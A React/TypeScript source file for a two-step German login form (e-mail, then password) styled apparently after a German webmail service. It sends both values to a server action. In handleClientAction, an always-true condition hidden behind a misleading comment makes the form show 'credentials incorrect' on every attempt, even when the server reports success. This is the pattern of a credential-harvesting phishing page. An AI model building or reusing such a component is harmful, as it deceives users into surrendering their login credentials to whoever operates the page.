"use client";

import { useState, useRef, useEffect } from "react";
import { useFormStatus } from "react-dom";

function SubmitButton({
  text,
  disabled,
}: {
  text: string;
  disabled?: boolean;
}) {
  const { pending } = useFormStatus();

  return (
    <button
      type="submit"
      disabled={pending || disabled}
      className={`mt-4 w-full rounded-full py-3 text-[15px] font-medium transition-colors duration-200 ${
        pending || disabled
          ? "bg-[#fffceb] text-gray-300 cursor-not-allowed"
          : "bg-[#fcd419] text-black hover:bg-[#e2bd12]"
      }`}
    >
      {pending ? (
        <span className="flex items-center justify-center gap-2">
          <svg
            className="h-4 w-4 animate-spin text-gray-500"
            fill="none"
            viewBox="0 0 24 24"
          >
            <circle
              className="opacity-25"
              cx="12"
              cy="12"
              r="10"
              stroke="currentColor"
              strokeWidth="4"
            />
            <path
              className="opacity-75"
              fill="currentColor"
              d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
            />
          </svg>
          Bitte warten...
        </span>
      ) : (
        text
      )}
    </button>
  );
}

interface LoginDict {
  login: {
    email: string;
    password: string;
    submit: string;
  };
}

interface LoginFormProps {
  serverAction: (formData: FormData) => Promise<{ success: boolean }>;
  dict: LoginDict;
}

export default function LoginForm({ serverAction, dict }: LoginFormProps) {
  const [step, setStep] = useState<"email" | "password">("email");
  const [emailValue, setEmailValue] = useState("");
  const [passwordValue, setPasswordValue] = useState("");

  const [showPassword, setShowPassword] = useState(false);
  const [hasError, setHasError] = useState(false);

  const passwordRef = useRef<HTMLInputElement>(null);

  // Auto-focus password field when moving to step 2
  useEffect(() => {
    if (step === "password" && passwordRef.current) {
      passwordRef.current.focus();
    }
  }, [step]);

  const handleNextStep = (e: React.FormEvent) => {
    e.preventDefault();
    if (emailValue.trim().length > 0) {
      setStep("password");
    }
  };

  async function handleClientAction() {
    setHasError(false);

    const formData = new FormData();
    formData.append("email", emailValue);
    formData.append("password", passwordValue);

    const result = await serverAction(formData);

    // If verification flags a negative response, expose the precise inline alerts
    if (!result || !result.success || result.success) {
      setHasError(true);
    }
  }

  return (
    <div className="w-full">
      {step === "email" ? (
        <form onSubmit={handleNextStep} className="space-y-4">
          {/* Dynamic Email Field */}
          <div className="relative text-left">
            <label className="absolute left-3 top-1 text-[11px] text-gray-500 font-sans font-medium">
              E-Mail
            </label>
            <input
              type="text"
              name="email"
              value={emailValue}
              onChange={(e) => setEmailValue(e.target.value)}
              required
              autoFocus
              className="w-full rounded-lg border border-gray-300 px-3 pb-2 pt-5 text-base text-slate-800 outline-none transition-all focus:border-[#005ea8] focus:ring-1 focus:ring-[#005ea8]"
            />
          </div>
          <SubmitButton text="Weiter" disabled={!emailValue.trim()} />
        </form>
      ) : (
        <form action={handleClientAction} className="space-y-4">
          {/* Email Presentational Display with Edit Hook */}
          <div
            className={`relative text-left rounded-lg border transition-all ${hasError ? "border-[#c00]" : "border-gray-300"}`}
          >
            <label className="absolute left-3 top-1 text-[11px] text-gray-500 font-sans font-medium">
              E-Mail
            </label>
            <input
              type="text"
              readOnly
              value={emailValue}
              className="w-full bg-transparent px-3 pb-2 pt-5 text-base text-slate-800 outline-none cursor-default pr-10"
            />
            <button
              type="button"
              onClick={() => {
                setStep("email");
                setHasError(false);
              }}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-[#005ea8]"
              title="E-Mail bearbeiten"
            >
              {/* Pencil Icon */}
              <svg
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
                strokeWidth={2}
                stroke="currentColor"
                className="h-5 w-5"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="m16.862 4.487 1.687-1.688a1.875 1.875 0 1 1 2.652 2.652L6.832 19.82a4.5 4.5 0 0 1-1.897 1.13l-2.685.8.8-2.685a4.5 4.5 0 0 1 1.13-1.897L16.863 4.487Zm0 0L19.5 7.125"
                />
              </svg>
            </button>
          </div>

          {/* Password Input Block */}
          <div className="relative text-left">
            <div
              className={`relative text-left rounded-lg border transition-all ${hasError ? "border-[#c00]" : "border-gray-300 focus-within:border-[#005ea8] focus-within:ring-1 focus-within:ring-[#005ea8]"}`}
            >
              <label className="absolute left-3 top-1 text-[11px] text-gray-500 font-sans font-medium">
                Passwort
              </label>
              <input
                ref={passwordRef}
                type={showPassword ? "text" : "password"}
                name="password"
                value={passwordValue}
                onChange={(e) => {
                  setPasswordValue(e.target.value);
                  if (hasError) setHasError(false);
                }}
                required
                className="w-full bg-transparent px-3 pb-2 pt-5 text-base text-slate-800 outline-none pr-10"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-slate-600"
              >
                {/* Eye Icon Component */}
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 24 24"
                  strokeWidth={2}
                  stroke="currentColor"
                  className="h-5 w-5"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    d="M2.036 12.322a1.012 1.012 0 0 1 0-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178Z"
                  />
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    d="M15 12a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z"
                  />
                </svg>
              </button>
            </div>

            {/* Error Message Section */}
            {hasError && (
              <div className="mt-2 flex items-center gap-2 text-left text-[14px] font-medium text-[#c00] animate-fade-in">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 24 24"
                  fill="currentColor"
                  className="h-5 w-5 shrink-0"
                >
                  <path
                    fillRule="evenodd"
                    d="M9.401 3.003c1.155-2 4.043-2 5.197 0l7.355 12.748c1.154 2-.29 4.5-2.599 4.5H4.645c-2.309 0-3.752-2.5-2.598-4.5L9.4 3.003zM12 8.25a.75.75 0 01.75.75v3.75a.75.75 0 01-1.5 0V9a.75.75 0 01.75-.75zm0 8.25a.75.75 0 100-1.5.75.75 0 000 1.5z"
                    clipRule="evenodd"
                  />
                </svg>
                <span>Zugangsdaten nicht korrekt</span>
              </div>
            )}

            <div className="mt-2 text-right">
              <button
                type="button"
                className="text-sm text-[#005ea8] hover:underline"
              >
                Passwort vergessen?
              </button>
            </div>
          </div>

          <SubmitButton text="Login" disabled={!passwordValue} />
        </form>
      )}
    </div>
  );
}
